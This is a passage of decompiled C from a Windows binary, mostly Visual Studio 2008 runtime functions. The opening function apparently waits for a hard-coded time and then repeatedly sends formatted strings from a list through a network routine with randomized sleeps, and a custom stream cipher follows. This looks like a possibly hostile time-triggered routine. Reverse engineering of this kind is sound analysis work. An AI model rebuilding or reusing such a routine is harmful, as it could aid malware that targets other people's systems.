  iVar3 = (*pFVar5)(0x101,local_518);
  if (iVar3 == 0) {
    do {
      local_1c = __time64((__time64_t *)0x0);
      iVar3 = (int)((ulonglong)local_1c >> 0x20);
      if (DAT_0041a13c < iVar3) break;
    } while ((iVar3 < DAT_0041a13c) || ((uint)local_1c < DAT_0041a138));
    DAT_00419f38 = &DAT_00419050;
    Sleep(2000);
    DVar6 = GetTickCount();
    FUN_0040698a(DVar6);
    while (*DAT_00419f38 != '\0') {
      do {
        puVar9 = (undefined4 *)&DAT_00416710;
        puVar12 = &local_88;
        for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
          *puVar12 = *puVar9;
          puVar9 = puVar9 + 1;
          puVar12 = puVar12 + 1;
        }
        *(undefined2 *)puVar12 = *(undefined2 *)puVar9;
        puVar15 = &DAT_0041a154;
        puVar14 = &DAT_00419ff8;
        uVar13 = 0x6fd207;
        iVar3 = DAT_00419450;
        pcVar7 = (char *)FUN_00402090();
        while( true ) {
          _sprintf(local_388,pcVar7,uVar13,puVar14,puVar15,iVar3);
          iVar3 = FUN_00405850(local_388);
          if (iVar3 != 0) break;
          while ((local_1c._4_4_ <= DAT_0041a13c &&
                 ((local_1c._4_4_ < DAT_0041a13c || ((uint)local_1c < DAT_0041a138))))) {
            local_1c = __time64((__time64_t *)0x0);
          }
          uVar10 = (uint)(DAT_00419450 * 2) / 3;
          uVar8 = _rand();
          Sleep(uVar10 + uVar8 % uVar10);
          puVar9 = (undefined4 *)&DAT_00416710;
          puVar12 = &local_88;
          for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {
            *puVar12 = *puVar9;
            puVar9 = puVar9 + 1;
            puVar12 = puVar12 + 1;
          }
          *(undefined2 *)puVar12 = *(undefined2 *)puVar9;
          puVar15 = &DAT_0041a154;
          puVar14 = &DAT_00419ff8;
          uVar13 = 0x6fd207;
          iVar3 = DAT_00419450;
          pcVar7 = (char *)FUN_00402090();
        }
        Sleep(2000);
        do {
          cVar1 = *DAT_00419f38;
          DAT_00419f38 = DAT_00419f38 + 1;
        } while (cVar1 != '\0');
      } while (*DAT_00419f38 != '\0');
      DAT_00419f38 = &DAT_00419050;
    }
  }
  ExceptionList = local_10;
  return 0;
}



undefined4 Catch_00406085(void)

{
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  return 0x406070;
}



void __thiscall FUN_00406120(void *this,int param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  byte bVar6;
  byte *in_EAX;
  uint uVar7;
  uint uVar8;
  byte bVar9;
  int iVar10;
  uint uVar11;
  byte local_10;
  uint local_c;
  void *local_8;
  
  local_c = 0x4b524f57;
  uVar7 = 0x44524148;
  if (0 < (int)this) {
    iVar10 = param_1 - (int)in_EAX;
    local_8 = this;
    do {
      uVar1 = uVar7 >> 0x18;
      uVar2 = uVar7 >> 0x10;
      uVar3 = uVar7 >> 8;
      uVar4 = local_c >> 0x18;
      uVar5 = local_c >> 0x10;
      local_10 = (byte)(local_c >> 8);
      bVar9 = (byte)local_c;
      uVar11 = (uVar7 * 4 ^ uVar7) * 2 ^ uVar7;
      bVar6 = (byte)uVar7;
      uVar8 = uVar7 << 4;
      uVar7 = local_c << 0x18 | uVar7 >> 8;
      local_c = (uVar11 & 0xfffffff0 ^ uVar8) << 0x14 | local_c >> 8;
      *in_EAX = (byte)uVar1 & (byte)uVar2 & (byte)uVar3 ^ (byte)uVar4 & (byte)uVar5 ^ in_EAX[iVar10]
                ^ local_10 & bVar9 ^ bVar6;
      in_EAX = in_EAX + 1;
      local_8 = (void *)((int)local_8 + -1);
    } while (local_8 != (void *)0x0);
  }
  return;
}



undefined4 __cdecl FUN_004061ca(LPCSTR param_1,LPCSTR param_2)

{
  BOOL BVar1;
  ulong uVar2;
  
  BVar1 = MoveFileA(param_1,param_2);
  if (BVar1 == 0) {
    uVar2 = GetLastError();
  }
  else {
    uVar2 = 0;
  }
  if (uVar2 != 0) {
    __dosmaperr(uVar2);
    return 0xffffffff;
  }
  return 0;
}



// Library Function - Single Match
//  _sprintf
// 
// Library: Visual Studio 2008 Release

int __cdecl _sprintf(char *_Dest,char *_Format,...)

{
  int *piVar1;
  int iVar2;
  FILE local_24;
  
  if ((_Format == (char *)0x0) || (_Dest == (char *)0x0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    local_24._base = _Dest;
    local_24._ptr = _Dest;
    local_24._cnt = 0x7fffffff;
    local_24._flag = 0x42;
    iVar2 = __output_l(&local_24,_Format,(_locale_t)0x0,&stack0x0000000c);
    local_24._cnt = local_24._cnt + -1;
    if (local_24._cnt < 0) {
      __flsbuf(0,&local_24);
    }
    else {
      *local_24._ptr = '\0';
    }
  }
  return iVar2;
}



// Library Function - Single Match
//  __make__time64_t
// 
// Library: Visual Studio 2008 Release

undefined8 __cdecl __make__time64_t(int param_1)

{
  int iVar1;
  int iVar2;
  int *in_EAX;
  int *piVar3;
  uint uVar4;
  errno_t eVar5;
  int iVar6;
  uint uVar7;
  tm *ptVar8;
  bool bVar9;
  longlong lVar10;
  undefined8 uVar11;
  longlong lVar12;
  tm local_4c;
  uint local_28;
  uint local_24;
  uint local_20;
  int local_1c;
  undefined8 local_18;
  int local_10;
  uint local_c;
  uint local_8;
  
  local_c = 0;
  local_8 = 0;
  if (in_EAX == (int *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    local_18._4_4_ = 0xffffffff;
    local_18._0_4_ = 0xffffffff;
    goto LAB_0040652b;
  }
  uVar7 = in_EAX[5];
  local_18 = (longlong)(int)uVar7;
  if ((((int)uVar7 >> 0x1f) + -1 + (uint)(0x44 < uVar7) == 0) && (uVar7 - 0x45 < 0x409)) {
    iVar6 = in_EAX[4];
    if ((iVar6 < 0) || (0xb < iVar6)) {
      uVar4 = iVar6 / 0xc;
      iVar6 = iVar6 % 0xc;
      iVar1 = uVar7 + uVar4;
      in_EAX[4] = iVar6;
      iVar2 = ((int)uVar7 >> 0x1f) + ((int)uVar4 >> 0x1f) + (uint)CARRY4(uVar7,uVar4);
      local_18 = CONCAT44(iVar2,iVar1);
      if (iVar6 < 0) {
        in_EAX[4] = iVar6 + 0xc;
        local_18 = CONCAT44(iVar2 + -1 + (uint)(iVar1 != 0),iVar1 + -1);
      }
      if ((local_18._4_4_ + -1 + (uint)(0x44 < (uint)local_18) != 0) ||
         (0x408 < (uint)local_18 - 0x45)) goto LAB_0040651a;
    }
    iVar6 = in_EAX[4];
    local_20 = (&DAT_0041829c)[iVar6];
    local_1c = (int)local_20 >> 0x1f;
    lVar10 = __allrem((uint)local_18,(uint)((ulonglong)local_18 >> 0x20),4,0);
    if (lVar10 == 0) {
      lVar10 = __allrem((uint)local_18,(uint)((ulonglong)local_18 >> 0x20),100,0);
      if (lVar10 == 0) goto LAB_0040636c;
LAB_00406388:
      if (1 < iVar6) {
        bVar9 = 0xfffffffe < local_20;
        local_20 = local_20 + 1;
        local_1c = local_1c + (uint)bVar9;
      }
    }
    else {
LAB_0040636c:
      lVar10 = __allrem((uint)local_18 + 0x76c,local_18._4_4_ + (uint)(0xfffff893 < (uint)local_18),
                        400,0);
      if (lVar10 == 0) goto LAB_00406388;
    }
    uVar4 = (uint)local_18 - 1;
    local_24 = local_18._4_4_ - (uint)((uint)local_18 == 0);
    local_28 = uVar4;
    lVar10 = __alldiv((uint)local_18 + 299,local_18._4_4_ + (uint)(0xfffffed4 < (uint)local_18),400,
                      0);
    uVar7 = (uint)(lVar10 + in_EAX[3]);
    local_10 = (int)((ulonglong)(lVar10 + in_EAX[3]) >> 0x20);
    uVar11 = __alldiv(uVar4,local_24,100,0);
    local_10 = (local_10 - (int)((ulonglong)uVar11 >> 0x20)) - (uint)(uVar7 < (uint)uVar11);
    lVar10 = __alldiv(uVar4,local_24,4,0);
    lVar10 = lVar10 + CONCAT44(local_10,uVar7 - (uint)uVar11);
    local_10 = (int)((ulonglong)lVar10 >> 0x20);
    lVar12 = __allmul((uint)local_18,(uint)((ulonglong)local_18 >> 0x20),0x16d,0);
    lVar10 = lVar12 + CONCAT44(local_10,(int)lVar10) + CONCAT44(local_1c,local_20);
    uVar7 = (uint)lVar10;
    lVar10 = __allmul(uVar7 - 0x63df,(int)((ulonglong)lVar10 >> 0x20) - (uint)(uVar7 < 0x63df),0x18,
                      0);
    lVar10 = __allmul((uint)(lVar10 + in_EAX[2]),(uint)((ulonglong)(lVar10 + in_EAX[2]) >> 0x20),
                      0x3c,0);
    local_18 = __allmul((uint)(lVar10 + in_EAX[1]),(uint)((ulonglong)(lVar10 + in_EAX[1]) >> 0x20),
                        0x3c,0);
    local_18 = local_18 + *in_EAX;
    if (param_1 == 0) {
      iVar6 = __gmtime64_s(&local_4c,&local_18);
LAB_00406504:
      if (iVar6 != 0) goto LAB_0040651a;
    }
    else {
      ___tzset();
      eVar5 = __get_dstbias((long *)&local_c);
      if (eVar5 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      eVar5 = __get_timezone((long *)&local_8);
      if (eVar5 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      local_18 = CONCAT44(local_18._4_4_ + ((int)local_8 >> 0x1f) +
                          (uint)CARRY4((uint)local_18,local_8),(uint)local_18 + local_8);
      eVar5 = __localtime64_s(&local_4c,&local_18);
      if (eVar5 != 0) goto LAB_0040651a;
      if ((0 < in_EAX[8]) || ((in_EAX[8] < 0 && (0 < local_4c.tm_isdst)))) {
        local_18 = CONCAT44(local_18._4_4_ + ((int)local_c >> 0x1f) +
                            (uint)CARRY4((uint)local_18,local_c),(uint)local_18 + local_c);
        iVar6 = __localtime64_s(&local_4c,&local_18);
        goto LAB_00406504;
      }
    }
    ptVar8 = &local_4c;
    for (iVar6 = 9; iVar6 != 0; iVar6 = iVar6 + -1) {
      *in_EAX = ptVar8->tm_sec;
      ptVar8 = (tm *)&ptVar8->tm_min;
      in_EAX = in_EAX + 1;
    }
  }
  else {
LAB_0040651a:
    piVar3 = __errno();
    local_18._4_4_ = 0xffffffff;
    *piVar3 = 0x16;
    local_18._0_4_ = 0xffffffff;
  }
LAB_0040652b:
  return CONCAT44(local_18._4_4_,(uint)local_18);
}



// Library Function - Single Match
//  __mktime64
// 
// Library: Visual Studio 2008 Release

__time64_t __cdecl __mktime64(tm *_Tm)

{
  __time64_t _Var1;
  
  _Var1 = __make__time64_t(1);
  return _Var1;
}



// Library Function - Single Match
//  _vscan_fn
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl _vscan_fn(undefined *param_1,int param_2,undefined4 param_3,undefined4 param_4)

{
  int *piVar1;
  undefined4 uVar2;
  char *unaff_ESI;
  
  _strlen(unaff_ESI);
  if ((unaff_ESI == (char *)0x0) || (param_2 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    uVar2 = 0xffffffff;
  }
  else {
    uVar2 = (*(code *)param_1)(&stack0xffffffdc,param_2,param_3,param_4);
  }
  return uVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  _sscanf
//  _sscanf_s
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict__sscanf(char *_Src,char *_Format,...)

{
  int iVar1;
  
  iVar1 = _vscan_fn(__input_l,(int)_Format,0,&stack0x0000000c);
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _free
// 
// Library: Visual Studio 2008 Release

void __cdecl _free(void *_Memory)

{
  uint *puVar1;
  BOOL BVar2;
  int *piVar3;
  DWORD DVar4;
  int iVar5;
  
  if (_Memory != (void *)0x0) {
    if (DAT_0041b410 == 3) {
      __lock(4);
      puVar1 = (uint *)___sbh_find_block((int)_Memory);
      if (puVar1 != (uint *)0x0) {
        ___sbh_free_block(puVar1,(int)_Memory);
      }
      FUN_00406623();
      if (puVar1 != (uint *)0x0) {
        return;
      }
    }
    BVar2 = HeapFree(DAT_00419558,0,_Memory);
    if (BVar2 == 0) {
      piVar3 = __errno();
      DVar4 = GetLastError();
      iVar5 = __get_errno_from_oserr(DVar4);
      *piVar3 = iVar5;
    }
  }
  return;
}



void FUN_00406623(void)

{
  FUN_0040a124(4);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _V6_HeapAlloc
// 
// Library: Visual Studio 2008 Release

int * __cdecl _V6_HeapAlloc(uint *param_1)

{
  int *local_20;
  
  local_20 = (int *)0x0;
  if (param_1 <= DAT_0041b400) {
    __lock(4);
    local_20 = ___sbh_alloc_block(param_1);
    FUN_004066a1();
  }
  return local_20;
}



void FUN_004066a1(void)

{
  FUN_0040a124(4);
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _malloc(size_t _Size)

{
  int *piVar1;
  int iVar2;
  size_t sVar3;
  uint dwBytes;
  
  if (_Size < 0xffffffe1) {
    do {
      if (DAT_00419558 == (HANDLE)0x0) {
        __FF_MSGBANNER();
        __NMSG_WRITE(0x1e);
        ___crtExitProcess(0xff);
      }
      if (DAT_0041b410 == 1) {
        dwBytes = _Size;
        if (_Size == 0) {
          dwBytes = 1;
        }
LAB_00406719:
        piVar1 = (int *)HeapAlloc(DAT_00419558,0,dwBytes);
      }
      else if ((DAT_0041b410 != 3) || (piVar1 = _V6_HeapAlloc((uint *)_Size), piVar1 == (int *)0x0))
      {
        sVar3 = _Size;
        if (_Size == 0) {
          sVar3 = 1;
        }
        dwBytes = sVar3 + 0xf & 0xfffffff0;
        goto LAB_00406719;
      }
      if (piVar1 != (int *)0x0) {
        return piVar1;
      }
      if (DAT_00419a00 == 0) {
        piVar1 = __errno();
        *piVar1 = 0xc;
        break;
      }
      iVar2 = __callnewh(_Size);
    } while (iVar2 != 0);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  else {
    __callnewh(_Size);
    piVar1 = __errno();
    *piVar1 = 0xc;
  }
  return (void *)0x0;
}



uint * __cdecl FUN_00406780(uint *param_1,char *param_2)

{
  char *pcVar1;
  char *pcVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  char cVar6;
  uint uVar7;
  char *pcVar8;
  uint uVar9;
  uint *puVar10;
  
  cVar3 = *param_2;
  if (cVar3 == '\0') {
    return param_1;
  }
  if (param_2[1] == '\0') {
    uVar4 = (uint)param_1 & 3;
    while (uVar4 != 0) {
      if (*(char *)param_1 == cVar3) {
        return param_1;
      }
      if (*(char *)param_1 == '\0') {
        return (uint *)0x0;
      }
      uVar4 = (uint)(uint *)((int)param_1 + 1) & 3;
      param_1 = (uint *)((int)param_1 + 1);
    }
    while( true ) {
      while( true ) {
        uVar4 = *param_1;
        uVar9 = uVar4 ^ CONCAT22(CONCAT11(cVar3,cVar3),CONCAT11(cVar3,cVar3));
        uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;
        puVar10 = param_1 + 1;
        if (((uVar9 ^ 0xffffffff ^ uVar9 + 0x7efefeff) & 0x81010100) != 0) break;
        param_1 = puVar10;
        if ((uVar7 & 0x81010100) != 0) {
          if ((uVar7 & 0x1010100) != 0) {
            return (uint *)0x0;
          }
          if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {
            return (uint *)0x0;
          }
        }
      }
      uVar4 = *param_1;
      if ((char)uVar4 == cVar3) {
        return param_1;
      }
      if ((char)uVar4 == '\0') {
        return (uint *)0x0;
      }
      cVar6 = (char)(uVar4 >> 8);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 1);
      }
      if (cVar6 == '\0') break;
      cVar6 = (char)(uVar4 >> 0x10);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 2);
      }
      if (cVar6 == '\0') {
        return (uint *)0x0;
      }
      cVar6 = (char)(uVar4 >> 0x18);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 3);
      }
      param_1 = puVar10;
      if (cVar6 == '\0') {
        return (uint *)0x0;
      }
    }
    return (uint *)0x0;
  }
  do {
    cVar6 = *(char *)param_1;
    do {
      while (puVar10 = param_1, param_1 = (uint *)((int)puVar10 + 1), cVar6 != cVar3) {
        if (cVar6 == '\0') {
          return (uint *)0x0;
        }
        cVar6 = *(char *)param_1;
      }
      cVar6 = *(char *)param_1;
      pcVar8 = param_2;
      puVar5 = puVar10;
    } while (cVar6 != param_2[1]);
    do {
      if (pcVar8[2] == '\0') {
        return puVar10;
      }
      if (*(char *)(uint *)((int)puVar5 + 2) != pcVar8[2]) break;
      pcVar1 = pcVar8 + 3;
      if (*pcVar1 == '\0') {
        return puVar10;
      }
      pcVar2 = (char *)((int)puVar5 + 3);
      pcVar8 = pcVar8 + 2;
      puVar5 = (uint *)((int)puVar5 + 2);
    } while (*pcVar1 == *pcVar2);
  } while( true );
}



uint * __cdecl FUN_00406820(uint *param_1,char param_2)

{
  uint uVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar1 = (uint)param_1 & 3;
  while (uVar1 != 0) {
    if (*(char *)param_1 == param_2) {
      return param_1;
    }
    if (*(char *)param_1 == '\0') {
      return (uint *)0x0;
    }
    uVar1 = (uint)(uint *)((int)param_1 + 1) & 3;
    param_1 = (uint *)((int)param_1 + 1);
  }
  while( true ) {
    while( true ) {
      uVar1 = *param_1;
      uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2,param_2),CONCAT11(param_2,param_2));
      uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;
      puVar5 = param_1 + 1;
      if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;
      param_1 = puVar5;
      if ((uVar3 & 0x81010100) != 0) {
        if ((uVar3 & 0x1010100) != 0) {
          return (uint *)0x0;
        }
        if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {
          return (uint *)0x0;
        }
      }
    }
    uVar1 = *param_1;
    if ((char)uVar1 == param_2) {
      return param_1;
    }
    if ((char)uVar1 == '\0') {
      return (uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 8);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 1);
    }
    if (cVar2 == '\0') break;
    cVar2 = (char)(uVar1 >> 0x10);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 2);
    }
    if (cVar2 == '\0') {
      return (uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 0x18);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 3);
    }
    param_1 = puVar5;
    if (cVar2 == '\0') {
      return (uint *)0x0;
    }
  }
  return (uint *)0x0;
}



// Library Function - Single Match
//  _atol
// 
// Library: Visual Studio 2008 Release

long __cdecl _atol(char *_Str)

{
  long lVar1;
  
  lVar1 = _strtol(_Str,(char **)0x0,10);
  return lVar1;
}



void __cdecl FUN_004068f4(char *param_1)

{
  _atol(param_1);
  return;
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2008 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_00418000)[uVar1 * 2]) {
      return (&DAT_00418004)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2008 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_00418168;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2008 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_0041816c;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



void __cdecl FUN_0040698a(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



// Library Function - Single Match
//  _rand
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl _rand(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  public: __thiscall _LocaleUpdate::_LocaleUpdate(struct localeinfo_struct *)
// 
// Library: Visual Studio 2008 Release

_LocaleUpdate * __thiscall
_LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this,localeinfo_struct *param_1)

{
  uint *puVar1;
  _ptiddata p_Var2;
  pthreadlocinfo ptVar3;
  pthreadmbcinfo ptVar4;
  
  this[0xc] = (_LocaleUpdate)0x0;
  if (param_1 == (localeinfo_struct *)0x0) {
    p_Var2 = __getptd();
    *(_ptiddata *)(this + 8) = p_Var2;
    *(pthreadlocinfo *)this = p_Var2->ptlocinfo;
    *(pthreadmbcinfo *)(this + 4) = p_Var2->ptmbcinfo;
    if ((*(undefined **)this != PTR_DAT_00418ac8) && ((p_Var2->_ownlocale & DAT_004189e4) == 0)) {
      ptVar3 = ___updatetlocinfo();
      *(pthreadlocinfo *)this = ptVar3;
    }
    if ((*(undefined **)(this + 4) != PTR_DAT_004188e8) &&
       ((*(uint *)(*(int *)(this + 8) + 0x70) & DAT_004189e4) == 0)) {
      ptVar4 = ___updatetmbcinfo();
      *(pthreadmbcinfo *)(this + 4) = ptVar4;
    }
    if ((*(byte *)(*(int *)(this + 8) + 0x70) & 2) == 0) {
      puVar1 = (uint *)(*(int *)(this + 8) + 0x70);
      *puVar1 = *puVar1 | 2;
      this[0xc] = (_LocaleUpdate)0x1;
    }
  }
  else {
    *(pthreadlocinfo *)this = param_1->locinfo;
    *(pthreadmbcinfo *)(this + 4) = param_1->mbcinfo;
  }
  return this;
}



// Library Function - Single Match
//  __isdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2008 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_00419a30 == 0) {
    return *(ushort *)(PTR_DAT_00418ab8 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isxdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isxdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 0x80;
  }
  else {
    uVar1 = __isctype_l(_C,0x80,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isxdigit
// 
// Library: Visual Studio 2008 Release

int __cdecl _isxdigit(int _C)

{
  int iVar1;
  
  if (DAT_00419a30 == 0) {
    return *(ushort *)(PTR_DAT_00418ab8 + _C * 2) & 0x80;
  }
  iVar1 = __isxdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isspace_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isspace_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 8;
  }
  else {
    uVar1 = __isctype_l(_C,8,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isspace
// 
// Library: Visual Studio 2008 Release

int __cdecl _isspace(int _C)

{
  int iVar1;
  
  if (DAT_00419a30 == 0) {
    return *(ushort *)(PTR_DAT_00418ab8 + _C * 2) & 8;
  }
  iVar1 = __isspace_l(_C,(_locale_t)0x0);
  return iVar1;
}



void __cdecl FUN_00406bc9(void *param_1)

{
  _free(param_1);
  return;
}



// Library Function - Single Match
//  _strrchr
// 
// Library: Visual Studio

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2008 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  int iVar2;
  uint *puVar3;
  int *piVar4;
  DWORD DVar5;
  LPVOID pvVar6;
  uint *local_24;
  int *local_20;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
    return (void *)0x0;
  }
  if (DAT_0041b410 == 3) {
    do {
      local_20 = (int *)0x0;
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_00406de6;
      __lock(4);
      local_24 = (uint *)___sbh_find_block((int)_Memory);
      if (local_24 != (uint *)0x0) {
        if (_NewSize <= DAT_0041b400) {
          iVar2 = ___sbh_resize_block(local_24,(int)_Memory,_NewSize);
          if (iVar2 == 0) {
            local_20 = ___sbh_alloc_block((uint *)_NewSize);
            if (local_20 != (int *)0x0) {
              puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
              if (_NewSize <= puVar3) {
                puVar3 = (uint *)_NewSize;
              }
              _memcpy(local_20,_Memory,(size_t)puVar3);
              local_24 = (uint *)___sbh_find_block((int)_Memory);
              ___sbh_free_block(local_24,(int)_Memory);
            }
          }
          else {
            local_20 = (int *)_Memory;
          }
        }
        if (local_20 == (int *)0x0) {
          if ((uint *)_NewSize == (uint *)0x0) {
            _NewSize = 1;
          }
          _NewSize = _NewSize + 0xf & 0xfffffff0;
          local_20 = (int *)HeapAlloc(DAT_00419558,0,_NewSize);
          if (local_20 != (int *)0x0) {
            puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
            if (_NewSize <= puVar3) {
              puVar3 = (uint *)_NewSize;
            }
            _memcpy(local_20,_Memory,(size_t)puVar3);
            ___sbh_free_block(local_24,(int)_Memory);
          }
        }
      }
      FUN_00406d51();
      if (local_24 == (uint *)0x0) {
        if ((uint *)_NewSize == (uint *)0x0) {
          _NewSize = 1;
        }
        _NewSize = _NewSize + 0xf & 0xfffffff0;
        local_20 = (int *)HeapReAlloc(DAT_00419558,0,_Memory,_NewSize);
      }
      if (local_20 != (int *)0x0) {
        return local_20;
      }
      if (DAT_00419a00 == 0) {
        piVar4 = __errno();
        if (local_24 != (uint *)0x0) {
          *piVar4 = 0xc;
          return (void *)0x0;
        }
        goto LAB_00406e13;
      }
      iVar2 = __callnewh(_NewSize);
